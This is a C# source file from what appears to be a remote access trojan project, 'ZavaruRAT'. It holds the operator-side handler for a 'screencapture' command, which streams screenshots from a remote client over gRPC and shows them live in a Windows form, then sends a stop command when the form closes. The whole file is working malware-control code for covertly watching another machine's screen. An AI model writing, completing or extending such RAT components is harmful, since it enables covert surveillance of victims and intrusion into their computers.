#region

using System.Buffers;
using Grpc.Core;
using MessagePack;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Admin.CommandHandlers;

public class ScreenCapture : CommandHandler
{
    private readonly AdminHub.AdminHubClient _adminClient;

    public ScreenCapture(AdminHub.AdminHubClient adminClient)
    {
        _adminClient = adminClient;
    }

    public override bool Match(string command)
    {
        return command == "screencapture";
    }

    public override async Task Handle(string hashId, string clientId,
                                      AsyncServerStreamingCall<CommandExecutedEvent> results)
    {
        // create windows form with image
        var form = new Form();
        form.Size = new Size(900, 800);

        var pictureBox = new PictureBox();
        pictureBox.Dock = DockStyle.Fill;
        pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
        form.Controls.Add(pictureBox);

        var cts = new CancellationTokenSource();

        var t = Task.Factory.StartNew(async () =>
        {
            while (!cts.IsCancellationRequested)
            {
                await foreach (var commandResult in results.ResponseStream.ReadAllAsync(cts.Token))
                {
                    if (commandResult.Result.IsEmpty || commandResult.Result.Memory.Length <= 4)
                    {
                        Console.WriteLine("Skipping command result: {0}", commandResult.HashId);
                        Console.WriteLine("Possibly finish");
                        continue;
                    }

                    pictureBox.BeginInvoke(() =>
                    {
                        var mem = commandResult.Result.Memory;
                        var image =
                            (byte[])MessagePackSerializer.Typeless.Deserialize(new ReadOnlySequence<byte>(mem));

                        using var ms = new MemoryStream(image);

                        try
                        {
                            pictureBox.Image?.Dispose();
                            pictureBox.Image = Image.FromStream(ms);
                            pictureBox.Refresh();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }
                    });
                }
            }
        }, TaskCreationOptions.LongRunning);

        form.ShowDialog();
        cts.Cancel();

        try
        {
            await await t;
        }
        catch (RpcException)
        {
            // ignored
        }

        await _adminClient.InvokeCommandAsync(new InvokeCommandRequest
        {
            HashId = hashId,
            Command = "",
            ClientId = clientId
        });
    }
}
